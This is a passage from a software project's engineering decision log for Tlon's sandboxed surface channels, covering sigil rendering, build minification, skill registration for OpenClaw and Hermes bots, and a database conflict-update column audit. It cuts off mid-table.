  right up until someone edits one side. This is host-side code inside the
  package whose boundary is the sandbox — deliberately so; the artifact
  entry does not reach it, and `check:deps` still refuses anything that
  would drag app internals in.

  Its unit tests moved with it (`app` 545 → 539, `surface-shell` 43 → 49);
  they run unchanged under happy-dom.

- **D62: sigil rendering is folded into the avatar primitive, and the core
  is imported rather than injected.**

  - **Vetting.** `@urbit/sigil-js@2.2.0` is MIT (Tlon's own). The `/core`
    entry is a total function from a point name to an SVG string with
    **no** `document`, `window`, `Date`, `performance`, `Math.random`,
    `fetch`, `XMLHttpRequest`, `localStorage` or `navigator` reference
    anywhere in the module — so it satisfies the "`render` never reads the
    clock" rule structurally rather than by inspection, and it runs under
    `default-src 'none'`. Only `invariant` comes along; `lodash.memoize` is
    used by the root export (a custom-element registration) and not by
    `/core`. `check:deps` therefore allows the **exact** specifier
    `@urbit/sigil-js/core` and not the package tree, so the web-component
    and React wrappers stay unreachable from shell source.
  - **Imported, not injected — deliberately unlike the Chart.js
    constructor (D58).** A chart needs a live 2D context and legitimately
    degrades to an empty state without one. A sigil is arithmetic, so
    injection would buy nothing but the possibility of the publish gate's
    happy-dom smoke render drawing an avatar the sandbox does not. That is
    exactly the divergence D61 exists to prevent.
  - **The core returns a STRING, not a structure.** v2 dropped v1's
    renderer split, so "pure core → SVG structure" is not on offer. The
    string is parsed into Preact vnodes with the already-vendored **htm**,
    which costs no new dependency and keeps the sigil out of
    `innerHTML` — markup assembly around a bundle-supplied ship name is
    precisely what not to do.
  - **Colors are token references handed straight to the library**
    (`var(--color-text-secondary)` on `var(--color-bg-secondary)`), which
    it substitutes into `fill`/`stroke` presentation attributes. Measured
    to resolve in chromium, firefox and webkit, both standalone and inside
    the real sandbox document. This buys a property the chart does not
    have: because the colors stay live custom-property references, a theme
    flip recolors an already-drawn sigil — the gap D58 recorded as "left
    alone" does not exist on this path.
  - **The library's pixel `width`/`height` are replaced with a real
    `viewBox`** (it emits a lowercase `viewbox`, which SVG ignores), so
    `.tsh-avatar`'s token owns the size and no pixel number is ever an
    author's to guess — the D58 rule again. A star's 2:1 drawing
    letterboxes rather than being squashed.
  - **An undrawable name degrades to initials, never throws.** sigil-js
    throws through `invariant` on anything that is not a galaxy, star or
    planet, and `ship` arrives from app state, so a bad one is ordinary
    input. A throw inside `render` would replace the whole app with the
    broken-state view. Note the library normalises leniently: `zod~~`
    draws ~zod's sigil, matching what the rest of the app does.
  - **Parsing is memoized under a fixed bound (128).** The key is
    app-supplied, so an unbounded cache would be an app-controlled
    allocation.
  - **`SHELL_VERSION` is unchanged.** A new optional prop is additive per
    plan §9; `<Avatar initials="…" />` renders exactly what it did, and
    `initials` merely widened from required to optional, so no existing
    call changes shape or behavior.

- **D63: the build now defines `process.env.NODE_ENV`, and the artifact
  check forbids `process.env` outright.** Vite's lib mode deliberately
  leaves the substitution to the consumer — but the consumer here is an
  iframe with no `process`, so an unreplaced read is a `ReferenceError`
  parked on a code path. Vendoring sigil-js put five of them in (its
  `invariant` guards), all on the not-a-point-name path, which is exactly
  the path an app reaches by accident. Found by grepping the built
  artifact, not by a failing test — which is why the assertion now lives in
  `check:determinism` alongside the no-zod one, where the next vendored
  dependency will trip it.

- **D64: minify is now worth flipping, and the numbers say so.** D32 left
  `minify: 'esbuild'` off while size did not matter. Measured on this
  branch (JS only, CSS is ~7.6 kB):

  |                                   | raw       | gzip     |
  | --------------------------------- | --------- | -------- |
  | before sigil, `minify: false`     | 506,407 B | 110.9 kB |
  | after sigil, `minify: false`      | 802,262 B | 129.1 kB |
  | before sigil, `minify: 'esbuild'` | 227,480 B | 79.0 kB  |
  | after sigil, `minify: 'esbuild'`  | 513,580 B | 96.5 kB  |

  Sigil adds **+295,855 B raw (+58%)**, and tree-shaking cannot touch it:
  the two symbol tables (208 kB detailed, 79 kB icon-grade) are indexed by
  a runtime-computed phoneme, so rollup keeps both even though the avatar
  only ever asks for the icon-grade one. Minifying returns the artifact to
  roughly its pre-sigil raw size (514 kB vs 506 kB) and _below_ its
  pre-sigil gzip (96.5 vs 110.9 kB). Recorded, not flipped: D32 called it
  a deliberate decision, and this is the evidence for making it, not the
  authority to make it.

- **D65: minify flipped on (supersedes D32's default).** Vendoring
  sigil-js grew the artifact 58% raw and it is embedded as a string
  constant in every client, so D32's "if embedding budgets care" became
  true. Measured:

  | build                      | raw         | gzip         |
  | -------------------------- | ----------- | ------------ |
  | unminified, pre-sigil      | 506,407     | 110.9 kB     |
  | unminified, post-sigil     | 802,262     | 129.1 kB     |
  | **minified + `keepNames`** | **528,343** | **102.6 kB** |

  Sigils land and the artifact still travels smaller than before them.

  **`keepNames: true`** costs ~14.7 kB raw over bare minification and is
  worth it. The sandbox is deliberately hard to inspect — no devtools on
  a native webview, no network — so a shell stack trace arriving over the
  bridge is frequently the only signal available, and names are what make
  it legible. That is the auditability the old "readable output"
  justification was actually reaching for; a whole unminified artifact
  was a costly proxy for it. The stale comment was replaced rather than
  left to mislead a future reader into flipping it back.

  Verified rather than reasoned: every artifact assertion is a string
  literal (`tsh-button`, `tsh-broken`, `tsh-avatar-sigil`, `ZodError`,
  `process.env`, `import(`) or a `window` property name
  (`__TLON_SURFACE_SHELL_VERSION`), neither of which esbuild mangles by
  default — and `check:all` passes in the new mode, determinism included.

  **A near-miss worth recording:** the first attempt put `keepNames`
  under `build.esbuildOptions`, which is not a Vite key. It was silently
  ignored and produced **byte-identical** output. Only measuring caught
  it — a config key that looks meaningful and does nothing is the same
  failure class as D45's dead-code-that-reads-like-protection, and it
  would have shipped a comment promising legible stack traces we did not
  have.

- **D66: skill location is `packages/tlon-skill/skills/surfaces/`, and it
  needs four registration changes nobody has made.** Plan §9 names the
  path; the deciding argument is coupling — the skill is inert without
  the `surface *` CLI verbs, which ship in `@tloncorp/tlon-skill`, so
  co-locating makes skill/CLI version skew impossible, keeps the docs
  beside the `templates/` CI renders, and means a Hermes deployment with
  the CLI but no plugin tree still gets it. `packages/openclaw/skills/`
  is where the repo puts _tool-less_ knowledge.

  **Discoverability is not automatic. Four gaps, all unaddressed:**
  1. `packages/tlon-skill/package.json` `files` omits `skills/` — the
     directory will not ship in the npm tarball.
  2. `scripts/release-package.ts` hard-fails unless `files` matches an
     exact required list, and stages only `SKILL.md` + `references/`.
  3. `packages/openclaw/openclaw.plugin.json` lists skills explicitly and
     needs `node_modules/@tloncorp/tlon-skill/skills/surfaces` — without
     it **no OpenClaw bot loads the skill at all**.
  4. Hermes registers skills one at a time by path
     (`packages/hermes-tlon-adapter/adapter.py`) and needs a third
     `register_skill` call plus a resolver.

  Written docs that ship nowhere are worth nothing; this is a blocking
  item for the authoring milestone, not a packaging detail.

- **D67: plan errors found while writing the doctrine.** Each verified
  against code, none silently smoothed over.

  - **`app.html` is wrong; the bundle is JavaScript.** Plan §9 and the
    SKILL draft both write `surface lint app.html spec.json`, but
    `buildSandboxDocument` injects `bundleSource` inside a `<script>` and
    `wrapBundleSource` wraps it in a function, so an `.html` file
    containing markup would not run. Both existing bundles are `.js`.
    The plan needs correcting, and the gate is being made
    extension-agnostic.
  - **§7 describes an escaping intermediate that does not exist.** It
    says the `$actor` segment is substituted "RFC 6901-escaped", but
    `resolveActorSegments` runs _after_ `parsePointer` has unescaped, so
    the plain ship goes into an already-unescaped segment and the state
    key is `~zod`. Same observable result, but the author-facing rule is
    position-dependent: hand-written path segments need `~0`, keys read
    back in `render` are plain. Verified at
    `packages/api/src/__tests__/surfaceJsonPointer.test.ts:244`.
  - **`duplicatesTolerated` is not in the schema.** The session-5 prompt
    introduces it as a gate feature, but `SurfaceActionSchema` declares
    only `ops` and `acceptStale` and `z.object` strips unknown keys — so
    it survives only in the **raw** persisted spec. A gate reading it off
    a validated spec would see `undefined` and fail every `append`
    action, including correctly-marked ones.
  - **`countdown` cannot work under the no-clock rule.** It is in the
    launch template set, but `render` may not read `Date`, so a countdown
    cannot tick or compute "3 days left" — only display a host-written
    target and host-written status. Either the template needs a host
    rollover cadence, or it waits for `$period` (§12).
  - **No app CSS reaches the sandbox**, so the poll fixture's
    `class="poll-option-label"` is inert — a class with no rule behind
    it. Worth removing when that fixture is promoted.

- **D68: `surface create` could never succeed — a tracked poke needs its
  subscriptions open.** Fixed in `createSurfaceDeps().authenticate`
  (`packages/tlon-skill/scripts/surface-runtime.ts`).

  `authenticate` called `ensureClient()` with **no** subscription apps, but
  `createChannel` is a **tracked** poke and a tracked poke's watcher is fed
  by the subscription stream. With nothing subscribed the watcher could
  never fire: the poke created the channel on the ship, and the tracker
  threw `TimeoutError` ~20s later. Every `surface create` therefore
  reported failure for work that had already landed — and D50's observation
  logic, which exists precisely to tell a real failure from a silent
  success, was never reached, because the tracker threw first.

  **The cost was not a retry.** D50 makes a channel name single-use forever,
  so each retry burned a name. Two real names are burned in
  `~zod/surface-seed`: `dash-pj14oqjp` and `dash-lc4k5q4w`.

  The fix is `ensureClient(['groups', 'channels'])`, matching the precedent
  at `packages/tlon-skill/scripts/groups.ts` — the same list for the same
  reason. `sendPost` and `updateChannel` are plain pokes, which is why
  publish and event were unaffected: the defect is exactly co-extensive
  with the tracked ones, which is also what makes it easy to miss.

  **Why it escaped the suite.** The surface command tests substitute a test
  double for `authenticate` (`scripts/surface-test-doubles.ts` — an empty
  async function), so the real subscription requirement is exercised by no
  test at all. The dep boundary that makes the command group testable is
  the same boundary that leaves its runtime assembly uncovered; every rule
  the commands enforce is tested, and the wiring that lets them run is not.

  **Follow-up: audit the remaining tracked pokes reachable from the
  `surface *` command group for the same gap.**
  `packages/api/src/client/channelsApi.ts` alone holds five `trackedPoke`
  call sites; `createChannel` is the one the surface path reaches today,
  and Session 6's `surface fork` reaches it again.

- **D69: `--preserve-state` discards the new `initialState`, and preview
  shows the opposite.** Verified in source. The publish behaviour is
  correct and does not change; the preview divergence is now labelled.

  `foldForMigration` (`scripts/commands/surface-publish.ts`) returns
  `published.initialState` **only** when there is no existing definition.
  When one exists it folds the channel's history against the **old** spec
  and snapshots that. So on any revision of a live channel, the new spec's
  `initialState` is dead on arrival. Preview does the opposite:
  `migrationSnapshotPost` (`scripts/surface-preview.ts`) stands in a
  snapshot of `spec.initialState`, because a `preserveState` spec folds to
  `migration-pending` with no snapshot and the populated cell would
  otherwise be empty for a reason that has nothing to do with the app.
  **Preview therefore renders the new `initialState` and production renders
  the carried state.**

  Three rulings, in order.

  **(a) Publish is right and does not change.** Preserving state means the
  carried state wins. Letting the new `initialState` overwrite it would
  make the flag mean something else, and would leave no way at all to say
  "keep the data".

  **(b) The preview divergence is labelled, not fixed by guessing.** §9
  claimed preview equals production "by construction, not by resemblance".
  That is true of **document assembly** — the same assembler, the same
  shell artifact, the same CSP, the same bridge protocol, pinned by the
  test that fails if the renderer stops using the shared function — and
  false of **state derivation**. For a `preserveState` spec the populated
  capture is knowingly optimistic: it shows the app running on the state
  the spec asks for, where production shows it running on the state the
  channel already had. Narrowed rather than withdrawn in §9 and in
  `RUBRIC.md`, because the assembly guarantee is the real one and is the
  one anything is pinned against.

  **(c) The authoring consequence is the most valuable part. Data that
  lives in state changes by host event, not by revision.** "Add a poll
  choice" is therefore **two** mechanisms: a spec revision for the handler
  and the declared action, and a host event for the choice itself. A bot
  that publishes a revision and reports "added" is wrong, and the user
  looks at an unchanged screen and concludes the bot is broken. Recorded in
  `PARADIGM.md` §13 and in `SKILL.md`'s revise step.

- **D70: preview cannot fold host events, so a host-is-the-clock app
  captures only its pre-rollover half.** `foldPopulatedState` folds
  **declared actions** only — there is no way to say "and then the host
  posted a rollover". For the workout tracker that means the chart card and
  the past-sessions card are empty in all twelve preview cells: everything
  a rollover produces is invisible to the reviewer, and those are exactly
  the elements preview exists to inspect. The tall fold-free phone cell was
  added (§9) so a chart below the fold appears in some capture; this is the
  same element missing for a different reason.

  **Ruled: do not build the fix now.** State the limitation where the
  scorer reads it (`RUBRIC.md`, with the other artifacts that are preview's
  and not the app's) and where the design is recorded (§9's preview
  paragraph), so nobody files "the chart is broken" against an app whose
  chart works.

  **Session 6 candidate: `--host-ops <file>`** — a file of host operations
  preview folds _after_ the actions, so a template can ship the rollover
  its own screenshots need. Session 6 adds seven more templates and several
  of them are host-dependent, so the gap widens before it narrows.

- **D71: the gate's computed-invoke rule is right; nothing taught the
  pattern that satisfies it.** Both promoted fixtures tripped
  `undeclared-action` on a computed `invoke(option.actionId)`.

  Iterating over state to build one button per item is the natural shape
  for a poll, and it disables the gate's only defence against a typo'd
  action id **for the whole bundle** — a computed argument cannot be
  cross-referenced against the spec at all, so the check degrades from
  "every id is declared" to "no id was checked". `PARADIGM.md` §2 already
  said a typo'd action id "quietly does nothing"; it never showed the shape
  that keeps ids literal while still rendering a list.

  **Ruled: the rule stands, the templates changed.** The pattern is a
  literal handler table keyed by item id — `const VOTE = { pizza: () =>
invoke('vote-pizza'), … }` — looked up per item, rendering a **disabled**
  control for an id with no entry rather than a live control that does
  nothing. Adding a choice is then two edits the gate keeps honest (an
  action in `spec.json`, a line in the table), and a missing one is visibly
  inert instead of quietly dead. Both promoted templates demonstrate it
  (`VOTE` in poll, `LOG` in workout-tracker) and both `NOTES.md` say why
  the argument is a literal.

  It goes into `PARADIGM.md` §2 **before** Session 6 writes seven more
  templates against it. Otherwise seven more generations reach for the
  computed form, and seven more get a warning with no remedy anywhere in
  the doctrine.

- **D72: the raw-vs-validated hazard generalizes past the gate (generalizes
  D67).** D67 recorded that `duplicatesTolerated` is not in
  `SurfaceActionSchema` and `z.object` strips unknown keys, so **the gate**
  must read it off the raw spec. That framing was too narrow: the same trap
  was hit a second time, in a different command.

  `surface publish`'s post-write observation compared
  `canonicalJson(read.spec)` — the **validated** view — against the raw
  object it had just written. Any gate-only marker was therefore present in
  what was written and absent from what was compared, so a landed write
  reported `publish-unconfirmed`. Net effect: every `append`-using app was
  unpublishable through the exact opt-out the gate **requires** and both
  `PARADIGM.md` and the gate's own violation message promise. Fixed in
  commit `5002b721ac` by comparing the verbatim cell, with a test pinning
  the round trip so a later "cleanup" to the validated view fails loudly.

  **The rule is not "the gate reads raw."** It is: **any comparison of a
  written spec against a read-back one must use the raw cell**, because the
  schema strips exactly the keys the gate depends on. Reading a _field_ off
  the validated spec stays correct; comparing _specs_ does not. §9's gate
  paragraph now states the general rule and names both instances rather
  than describing only the gate's.

  Two instances in two different commands is enough to suspect a third.
  **Follow-up: audit the remaining read-back comparisons.** Today's other
  writer observations compare `post.blob` as a string, which is already raw
  against raw; the live risk is Session 6's `surface fork`, which reads a
  source spec and republishes it — republishing the validated view would
  silently drop `duplicatesTolerated` from every forked `append` app, and
  the fork would fail its own gate on a bundle that passed at the source.

- **The step-9 jargon-denylist bullet closes with no additions.** Session
  5's step 5 said to extend the denylist "as template work suggests".
  Template work is now done: the workout tracker tripped the jargon rule on
  **"spec"**, which is already one of the six terms (`rollover`,
  `revision`, `invoke`, `spec`, `scratch`, `$actor`), and writing both
  templates surfaced no new jargon. **The denylist needs no additions** —
  recorded explicitly so the bullet closes rather than staying silently
  open. Step 9's companion requirement, that §9's gate paragraph be the
  union of the gate as designed and the gate as built, is likewise
  satisfied: **the gate did not change during template promotion — the
  templates did.**

### Found, flagged, not fixed (session 5, template promotion)

- **`surface publish` has no dev storage path.** Without an S3-compatible
  endpoint it dies at `storage-unavailable`, so the whole pipeline is
  unrunnable against a fakeship — the one environment where it is cheap to
  run. The seed already faces this problem and solved it: it ships a local
  bundle server (`packages/shared/seed/bundleServer.ts`) precisely because
  provisioning a bucket is an out-of-repo human step, and the client does
  not special-case it. Publish has no equivalent. Session 5 worked around
  it with a ~70-line throwaway stub that lives in the session scratchpad,
  not in the repo, and will be lost. **Ruled:** either the CLI grows a
  documented dev-storage story or the plan's provisioning list says plainly
  that the loop is unrunnable locally without one — the note is added to
  the provisioning list now, and promoting a real dev-storage stub is a
  Session 6 candidate.

- **Preview's synthetic crew was three galaxies** (`~zod`, `~ten`,
  `~mug`). Measured rather than assumed: at the `detail: 'none'` grade the
  avatar primitive uses, sigil-js draws each galaxy as **exactly one
  featureless glyph** — `~zod` a `<circle>`, `~ten` a `<rect>`, `~mug` a
  `<path>` — against a planet's four. Every crew list in every capture was
  therefore three near-identical marks. (An earlier write-up of this
  finding claimed `~zod` and `~ten` emitted _no_ glyph at all and rendered
  as blank swatches; that came from counting only `<path>` elements and
  missing the circle and the rect. The conclusion is unchanged, the
  severity was overstated.) A reviewer scoring `RUBRIC.md`'s
  readability check could reasonably file "the avatars are broken" against
  an app whose avatars are fine. **Fixed narrowly:** `PREVIEW_ACTORS` is
  now `['~zod', '~ten', '~palfun-foslup']`, so at least one capture shows
  the four-glyph sigil most real members have. Two galaxies remain on
  purpose — a galaxy is a legitimate member and the crew should not be
  uniform — and the residual stands regardless: **synthetic preview actors
  are not real group members and their sigils are not a quality signal.**
  Stated in `RUBRIC.md` so it is scored that way.

- **A running rube web server cannot resolve
  `@tloncorp/surface-shell/sandbox` after the lockfile changes under it**,
  and shows a vite overlay where the app should be. A freshly started
  server re-optimizes its dependencies and works. Not a code defect — a
  trap that reads exactly like "the app is broken", costing a debugging
  cycle to whoever hits it next. Worth a line wherever the seed and dev-loop
  instructions live (`docs/tlon-apps/surface-channels-seed.md`).

- **The shell's own poll fixture still carries the inert
  `class="poll-option-label"`** that D67 flagged (no app CSS reaches the
  sandbox, so the class has no rule behind it). Discharged for the promoted
  template; `packages/surface-shell/fixtures/poll/` was deliberately left
  untouched, because it is the shell's own test fixture and its job is to
  exercise the shell, not to model authoring style.

### Session 5 addendum: shipping the skill (D66 closure)

- **D73: the compiled CLI could never find its own templates.**
  `templatesRoot()` resolved the catalogue from `path.resolve(__dirname,
'..')`, under a comment asserting "the compiled binary keeps the same
  layout beside it." It does not. `bun build --compile` bakes `__dirname`
  into the binary as a **string literal** — verified by `strings` on
  `dist/tlon-run`, which contains the build machine's
  `.../packages/tlon-skill/scripts`, and by running the binary from an
  unrelated cwd, where it still printed the build machine's path as the
  template root. On a published build that path is the CI runner's
  checkout and does not exist on the user's machine.

  It is also structurally unfixable from inside the binary: the binary
  ships in the **platform** package (`@tloncorp/tlon-skill-<target>`,
  which contains only `tlon` and a `package.json`), while `skills/` ships
  in the **root wrapper** package. Nothing reachable from the binary
  points at the wrapper.

  **Fixed in `bin/tlon.js`**, which is the one component that knows: it is
  plain uncompiled JS, so its `__dirname` is real at runtime. It now sets
  `TLON_SURFACE_TEMPLATES_DIR` from its own location when the directory
  exists and no explicit override is present. Verified against a staged
  install layout (wrapper with `skills/`, platform package with only the
  binary): through the wrapper the catalogue resolves to the staged path;
  calling the same binary directly still reports the baked build-machine
  path, which is the mutation proving the wrapper is doing the work.

  This mattered more than an ordinary packaging bug because `SKILL.md`'s
  step 1 is "run `surface templates list`", and its step 1 rule is "adapt
  the closest template — never invent from scratch". A shipped skill whose
  first instruction returns nothing degrades every authoring run to the
  path the doctrine explicitly forbids.

  One correction to how this was first reported: the failure is **not**
  silent. `--json` returns `"installed": false` alongside the resolved
  `root`, and the human output says "No dashboard templates are installed
  (looked in X)". A caller can already distinguish a broken install from
  an empty one; the resolution was wrong, the reporting was not.

- **D74: under Hermes the skill is SKILL.md and nothing else.**
  `_serve_plugin_skill` (`tools/skills_tool.py`) ignores `skill_view`'s
  `file_path` argument for plugin skills and serves SKILL.md only, so a
  Hermes-hosted bot cannot reach `PARADIGM.md`, `PRIMITIVES.md`,
  `RUBRIC.md` or `templates/**` through the skill mechanism — it needs an
  ordinary file read. Pre-existing (the CLI skill's `references/` has the
  same problem) and not introduced by the registration work, but it means
  the two runtimes do not deliver the same skill: OpenClaw publishes the
  whole directory into the SDK's discovery tree, Hermes hands over one
  file. Compounding it, Hermes plugin skills are not listed in the system
  prompt's `<available_skills>` index at all — they are opt-in explicit
  loads — which is why registration also had to add a `surfaces_hint` to
  `platform_hint`, mirroring the product guide's.

  Consequence to carry into Session 6: the doctrine documents are
  load-bearing (`PARADIGM.md` is what stops a bot writing a non-idempotent
  `append` app), so on Hermes they must either be inlined into SKILL.md's
  preprocessing includes or reached by file read. Do not assume a
  registered skill means a readable skill.

- **Registering a skill takes six steps, not four.** D66 listed
  `package.json` `files`, `release-package.ts`, `openclaw.plugin.json`,
  and `adapter.py`. Two more were found by grepping an existing skill's
  name repo-wide: `plugin.yaml`'s `optional_env` (Hermes surfaces the
  resolution env vars at install/config time) and `test_tlon_tool.py`
  (which enumerates registered skills and asserts registration and hint
  fragment together). `release-utils.ts` was a third place inside step 2 —
  `assertRootTarball`'s allowlist would have rejected every `skills/**`
  entry as unexpected, so a fix touching only `release-package.ts` would
  have hard-failed the release. **The lesson is the method, not the
  count:** grep an existing instance's name across the whole repo before
  assuming a registration list is complete.

- **Deploy asymmetry worth knowing.** `bot-harness-deploy.yml`
  deliberately keeps `packages/tlon-skill` outside its path filter, so a
  content fix to the surfaces skill reaches production only via an npm
  publish and restart, not a develop merge — unlike the product guide.
  The `openclaw.plugin.json` manifest entry _is_ on that filter, so
  merging it before publishing a tlon-skill version containing `skills/`
  logs a benign `plugin skill path not found` warning until the publish
  lands (the entry is skipped; the other two skills still load).

### Session 5 addendum: what the spec-propagation trace found

- **D75: the D56 fix added a write-ordering dependency that did not exist
  before. Recorded, not changed.** `handleGroupUpdate`'s `updateChannel`
  case writes the new payload via `db.updateChannel`, then calls
  `syncGroup(…, {force: true})` three lines later, which calls
  `insertGroups` against a fresh `api.getGroup`. Pre-fix, `insertGroups`
  skipped `descriptionPayload`/`surfaceSpec` and could not disturb the
  correct write that preceded it. Post-fix it rewrites them.

  **Symptom to watch for:** if `api.getGroup` ever returns pre-edit state
  — a queue delay racing the edit fact — the forced sync can now revert a
  correct value that the old code was structurally incapable of touching.
  `%groups` updates its state before emitting the fact, so the scry should
  be at-or-newer and the risk is low. No code change; this exists so that
  a future "the republish reverted itself seconds later" report is
  diagnosed in one step instead of re-derived.

- **The live revise cycle never exercised the D56 fix.** Recorded because
  the session report claimed it did. A running client _does_ reach
  `insertGroups` (via the forced `syncGroup` above — the premise that it
  does not is false), but ordering makes it inert: `db.updateChannel`
  writes the correct value first, so pre-fix and post-fix produce
  byte-identical rows on that path. The live test proved the `r-groups`
  edit-fact carrier works, which was never the broken part.

  The fixed path is boot / full group sync on an **existing** row, and it
  is already covered deterministically by
  `packages/shared/src/store/surface/specConvergence.test.ts` —
  `syncGroupFromShip` _is_ `insertGroups` through the real wire payload,
  called twice so the second hits `onConflictDoUpdate`, asserting both
  columns in both directions (unchanged revision, bumped revision). Runs
  in 59ms. **A live cold-start scenario would prove less than a test that
  already runs in CI**, so it is not worth a rube cycle.

  The genuinely untested path is the live one: nothing anywhere drives
  `r-channel edit` → `toClientChannel` → `db.updateChannel`. Correct by
  reading, unguarded by a test. Added to the fix round as non-blocking.

- **D76: patching the allowlist fixed the incident and left the class
  open — and the class already had two more live instances.** The D56 fix
  appended `descriptionPayload` and `surfaceSpec` to `insertGroups`'
  hand-listed `onConflictDoUpdate` columns, leaving it diverged from
  `insertChannelsInternal`, which uses `conflictUpdateSetAll` with an
  exclusion list and was always correct.

  Verified consequence: `metaFields` (`schema.ts:40-47`) gives channels
  `iconImageColor` and `coverImageColor`, `toClientChannel` populates
  both, and **`insertGroups`' allowlist omits both**. An admin changing a
  channel's icon or cover colour lands live via `db.updateChannel` and is
  then pinned forever on every boot and group sync. Cosmetic rather than
  functional, which is why it went unnoticed — and it is the identical
  defect, which is why it matters.

  There are three whole-row writers of `channels` (`insertGroups`,
  `insertChannelsInternal`, `updateChannel`), no writers outside
  `queries.ts`, no raw SQL, and no data-modifying migration. No fourth
  writer lurking. No test anywhere would catch a new schema column being
  added and not added to the allowlist; that absence is the defect's
  enabling condition.

  **Ruling — both mechanisms, in the fix round, not as an immediate
  patch:**
  1. Switch `insertGroups` to `conflictUpdateSetAll` with an exclusion
     list derived by an **explicit audit** of which columns are
     sync-authoritative versus client-local. The exclusion list must be
     reasoned, not copied from `insertChannelsInternal` — inverting the
     default from opt-in to opt-out is only safe if every excluded column
     is deliberately excluded.
  2. Add a `getTableColumns($channels)` pin test asserting **total
     coverage** — every column classified as either updated or explicitly
     excluded, so a newly added column fails loudly rather than silently
     joining the pinned set.
  3. The colour columns are fixed by (1); verify with a
     spec-convergence-style test extended to cover them, so the fix is
     demonstrated and not merely asserted.

- **The class-versus-incident distinction paid for itself twice in one
  investigation, and is now the fix round's organising principle.** The
  report said "D56 fixed"; the shape check found the class open; the class
  being open meant two more live instances nobody had looked for.

  Finding 2 of the correctness review (`duplicatesTolerated` treated as a
  change because `decideRevision` compares a validated previous spec
  against a raw candidate) has the **identical structure**: three
  comparison sites patched one at a time, schema divergence intact
  underneath. That is why it gets the same ruling as this one — fix the
  divergence, not the third comparison.

  **Every High finding in this review has an incident fix and a class fix,
  and the class fix is the deliverable.** The session that runs the fix
  round should be briefed in exactly those terms; a round that closes
  fourteen incidents and leaves four classes open has bought very little.

### Fix round: `insertGroups` channel conflict-update set (D76 execution)

- **D77: the per-column audit, and what it found that the D76 ruling did
  not anticipate.** `insertGroups` now uses
  `conflictUpdateSetAll($channels, channelConflictExclusions)`. The
  exclusion list was derived column by column from
  `getTableColumns($channels)`, **not** copied from
  `insertChannelsInternal` — cloning its four exclusions would have
  reproduced the same defect sign-flipped.

  The audit turned up a second, independent reason a column belongs on the
  exclusion list, which the ruling did not have in view. Drizzle's
  `buildInsertQuery` (`node_modules/drizzle-orm/sqlite-core/dialect.js`
  L286-336) emits **every** column of the table in the INSERT, substituting
  a literal `null` for any key absent from the values object (or the
  column's declared default, e.g. `isDmInvite`'s `false`). So
  `excluded.<col>` is null for anything the payload does not carry, and
  naming such a column in the conflict-update set does not refresh it — **it
  erases it**.

  `toClientChannel` (`packages/api/src/client/groupsApi.ts` ~2005) carries
  only 13 of the table's 29 columns. Two columns the old hand-list named —
  `addedToGroupAt` and `isPendingChannel` — are not among them, which means
  the pre-fix code was **nulling both on every boot and every group sync**.
  Demonstrated, not inferred: the new
  `specConvergence.test.ts` case "a group sync preserves channel columns
  the payload does not carry" failed pre-fix with
  `expected null to be 1700000000000`. `addedToGroupAt` matters slightly —
  `channelActions.ts` L421 re-encodes the wire's `added` from this column
  (`currentChannel?.addedToGroupAt ?? … ?? Date.now()`), so an erased value
  is silently replaced with "now" on the next metadata edit.
  `isPendingChannel` is DM-only, so nulling it on group channels was
  harmless in practice. Both are now excluded, which is a fix, not a
  regression.

  The classification, all 29 columns:

  | Column                 | Call           | Why                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
  | ---------------------- | -------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
  | `id`                   | update (no-op) | The conflict target; `set id = excluded.id` is provably a self-assignment. Left in the derived set rather than excluded so the exclusion list reads as "things deliberately held back".                                                                                                                                                                                                                                                                                                                                                                                                                   |
  | `type`                 | update         | `getChannelType(id)`; %groups defines it.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
  | `groupId`              | update         | %groups defines which group a channel is in. **Behaviour change**: the old hand-list omitted it, so the mapping was pinned. Every non-test caller carries it (all reach `insertGroups` via `toClientChannel(s)` or a full DB row), and `insertGroups` already reconciles group membership by deleting non-payload channels for the group, so authoritative reassignment is consistent with the surrounding write.                                                                                                                                                                                         |
  | `iconImage`            | update         | From `meta.image`.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
  | `iconImageColor`       | update         | Same `meta.image` field, routed by `toClientMeta`'s `isColor`. **The D76 incident.**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
  | `coverImage`           | update         | From `meta.cover`.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
  | `coverImageColor`      | update         | Same field. **The D76 incident.**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
  | `title`                | update         | From `meta.title`.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
  | `description`          | update         | Decoded from `meta.description`.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
  | `contentConfiguration` | update         | Decoded from the same cell.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
  | `descriptionPayload`   | update         | The verbatim cell (D56).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
  | `surfaceSpec`          | update         | The app definition inside it (D56).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
  | `currentUserIsHost`    | update         | Derived from the channel id's host vs the current ship.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
  | `currentUserIsMember`  | **exclude**    | `reconcileJoinedGroupChannels` is the documented "single source of truth for group-channel membership" (`queries.ts` ~3468), driven by %groups' `active-channels`. `toClientChannel`'s value is a _different, weaker_ signal — readers ∩ roles, i.e. read permission, not active membership. `handleGroupUpdate`'s `updateChannel` case already strips it for that reason, and `agentGroupOnboarding.ts` (`adoptNotebook`, `ensureChatChannel`) and `channelActions.ts` L161 both document _depending_ on this write not touching it. Including it would have been the single riskiest call in the audit. |
  | `addedToGroupAt`       | **exclude**    | Not carried (see above); naming it nulls it.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
  | `isPendingChannel`     | **exclude**    | Not carried; DM/pending-channel bookkeeping owned by `postActions`.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
  | `contactId`            | **exclude**    | DM identity; %groups carries no contact for a group channel.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
